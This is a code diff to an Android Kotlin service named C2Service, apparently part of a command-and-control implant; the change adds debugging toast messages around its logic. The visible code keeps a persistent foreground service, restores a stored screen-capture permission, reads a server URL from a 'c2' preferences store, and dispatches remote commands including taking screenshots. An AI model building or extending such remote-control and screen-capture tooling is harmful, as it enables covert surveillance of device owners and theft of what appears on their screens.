@@ -6,8 +6,11 @@ import android.content.Intent
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
+import android.os.Looper
 import android.util.Log
+import android.widget.Toast
 import androidx.core.app.NotificationCompat
 import kotlinx.coroutines.*
 import okhttp3.*
@@ -36,6 +39,7 @@ class C2Service : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        toast("C2Service onCreate")
         Log.i(TAG, "onCreate deviceId=$deviceId")
         startForeground(1, buildNotification())
         serverUrl = getSharedPreferences("c2", MODE_PRIVATE)
@@ -50,6 +54,7 @@ class C2Service : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "onStartCommand action=${intent?.action}")
+        toast("onStartCommand action=${intent?.action}")
         if (intent?.action == "START_PROJECTION") {
             val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
             val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
@@ -57,14 +62,18 @@ class C2Service : Service() {
             else
                 @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
             Log.i(TAG, "START_PROJECTION code=$code data=$data")
+            toast("START_PROJECTION received")
             if (code != Int.MIN_VALUE && data != null) {
                 initProjectionFromIntent(code, data)
+            } else {
+                toast("START_PROJECTION invalid: code=$code data=$data")
             }
         }
         return START_STICKY
     }
 
     private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
+        toast("initProjection: code=$resultCode")
         Log.i(TAG, "initProjectionFromIntent code=$resultCode")
         try {
             val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
@@ -72,18 +81,22 @@ class C2Service : Service() {
             projection = null
 
             val proj = mpm.getMediaProjection(resultCode, data)
+            toast("getMediaProjection: $proj")
             Log.i(TAG, "getMediaProjection returned=$proj")
             if (proj == null) return
 
             proj.registerCallback(object : MediaProjection.Callback() {
                 override fun onStop() {
+                    toast("projection onStop")
                     Log.i(TAG, "projection onStop")
                     projection = null
                 }
-            }, android.os.Handler(android.os.Looper.getMainLooper()))
+            }, Handler(Looper.getMainLooper()))
             projection = proj
+            toast("projection ACTIVE")
             Log.i(TAG, "projection ACTIVE")
         } catch (e: Exception) {
+            toast("initProjection ERROR: ${e.message}")
             Log.e(TAG, "initProjection failed", e)
             projection = null
         }
@@ -94,11 +107,15 @@ class C2Service : Service() {
         val code = prefs.getInt("proj_code", Int.MIN_VALUE)
         val uri = prefs.getString("proj_data", null)
         Log.i(TAG, "tryInitProjectionFromPrefs code=$code uri=${uri?.take(50)}")
-        if (code == Int.MIN_VALUE || uri == null) return
+        if (code == Int.MIN_VALUE || uri == null) {
+            toast("no stored projection permission")
+            return
+        }
         try {
             val data = Intent.parseUri(uri, 0)
             initProjectionFromIntent(code, data)
         } catch (e: Exception) {
+            toast("parseUri failed: ${e.message}")
             Log.w(TAG, "parseUri failed: ${e.message}")
         }
     }
@@ -160,9 +177,11 @@ class C2Service : Service() {
                 "screenshot" -> {
                     val p = projection
                     if (p == null) {
+                        toast("screenshot: projection NULL")
                         Log.w(TAG, "screenshot: projection is NULL")
                         JSONObject().put("error", "projection_not_ready")
                     } else {
+                        toast("screenshot: capturing...")
                         Log.i(TAG, "screenshot: capturing...")
                         Screenshot.capture(this, p)
                     }
@@ -215,7 +234,16 @@ class C2Service : Service() {
             }
         }
 
+    private fun toast(msg: String) {
+        try {
+            Handler(Looper.getMainLooper()).post {
+                Toast.makeText(applicationContext, msg, Toast.LENGTH_SHORT).show()
+            }
+        } catch (_: Exception) {}
+    }
+
     override fun onDestroy() {
+        toast("C2Service onDestroy")
         Log.i(TAG, "onDestroy")
         try { projection?.stop() } catch (_: Exception) {}
         projection = null
